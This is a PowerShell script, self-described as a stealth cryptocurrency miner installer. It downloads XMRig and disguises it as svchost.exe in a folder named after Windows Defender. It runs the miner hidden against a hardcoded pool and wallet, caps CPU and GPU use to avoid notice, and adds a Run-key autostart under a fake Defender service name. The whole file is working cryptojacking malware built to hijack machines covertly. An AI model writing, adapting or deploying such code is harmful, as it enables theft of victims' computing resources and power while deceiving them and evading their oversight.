# StartMining.ps1 - Stealth miner installer & launcher with CPU/GPU limit and autostart
$minerFolder = "C:\WindowsDefender"
$exeName = "svchost.exe"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
$pool = "159.203.162.18:3333"
$password = "x"
$zipPath = "$minerFolder\xmrig.zip"
$logFile = "$minerFolder\miner.log"
$startupKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$startupName = "WindowsDefenderService"

# Create miner directory
if (-not (Test-Path $minerFolder)) {
    New-Item -Path $minerFolder -ItemType Directory -Force | Out-Null
}

# Download and extract xmrig if not already there
if (-not (Test-Path "$minerFolder\$exeName")) {
    Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipPath

    $extractPath = "$minerFolder\tmp"
    Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath -Force

    $xmrigPath = Get-ChildItem -Recurse -Path $extractPath -Filter "xmrig.exe" | Select-Object -First 1
    if ($xmrigPath) {
        Copy-Item $xmrigPath.FullName -Destination "$minerFolder\$exeName" -Force
    }

    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# Detect if GPU is available
$gpuArgs = ""
$gpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "NVIDIA|AMD|Radeon" }
if ($gpu) {
    $gpuArgs = "--cuda --cuda-bfactor=6 --cuda-threads=1 --cuda-max-threads-hint=20"
}

# Build miner command
$cmdArgs = "--algo randomx --url $pool --user $wallet --pass $password --cpu-threads 1 --donate-level 1 --print-time 60 --log-file `"$logFile`" --no-color --api-port 0 $gpuArgs"

# Start miner silently
Start-Process -FilePath "$minerFolder\$exeName" -ArgumentList $cmdArgs -WindowStyle Hidden

# Add to startup (non-admin)
$scriptPath = $MyInvocation.MyCommand.Path
Set-ItemProperty -Path $startupKey -Name $startupName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
